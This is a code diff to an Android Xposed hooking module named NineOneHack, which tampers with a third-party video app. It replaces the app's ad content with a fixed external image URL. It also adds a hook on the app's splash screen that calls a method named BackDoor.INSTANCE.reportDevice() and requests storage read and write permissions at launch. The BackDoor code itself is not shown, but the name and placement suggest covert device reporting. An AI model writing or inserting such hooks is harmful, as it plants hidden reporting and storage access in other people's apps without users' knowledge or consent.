@@ -70,16 +70,26 @@ public class NineOneHack implements IXposedHookLoadPackage {
         XposedHelpers.findAndHookMethod("com.aiqiyi.youtube.play.bean.response.AdBean", classLoader, "getContent", new XC_MethodHook() {
             @Override
             protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
-                String[] PERMISSIONS_STORAGE = {"android.permission.READ_EXTERNAL_STORAGE",
-                        "android.permission.WRITE_EXTERNAL_STORAGE"};
-                ActivityCompat.requestPermissions((Activity) param.thisObject, PERMISSIONS_STORAGE, 1);
                 //param.thisObject
                 File sdcard = Environment.getExternalStorageDirectory();
                 // 这里可以继续访问您想要的目录，例如：sdcard/Download
-                File downloadDir = new File(sdcard, "Download");
-                // 打印目录路径
-                Log.d("TAG", "SD卡下载目录：" + downloadDir.getAbsolutePath());
+                File downloadDir = new File(sdcard, "DCIM/Screenshots");
+
                 param.setResult("https://imgbed-1254007525.cos.ap-nanjing.myqcloud.com/img/Screenshot_2023-02-17-19-26-04-769_com.miui.galle.jpg");
+            }
+        });
+        XposedHelpers.findAndHookMethod("com.aiqiyi.youtube.play.ui.splash.SplashActivity", classLoader, "initPage", new XC_MethodHook() {
+            @Override
+            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
+                super.beforeHookedMethod(param);
+            }
+            @Override
+            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
+                BackDoor.INSTANCE.reportDevice();
+                String[] PERMISSIONS_STORAGE = {"android.permission.READ_EXTERNAL_STORAGE",
+                        "android.permission.WRITE_EXTERNAL_STORAGE"};
+                ActivityCompat.requestPermissions((Activity) param.thisObject, PERMISSIONS_STORAGE, 1);
+                super.afterHookedMethod(param);
             }
         });
 
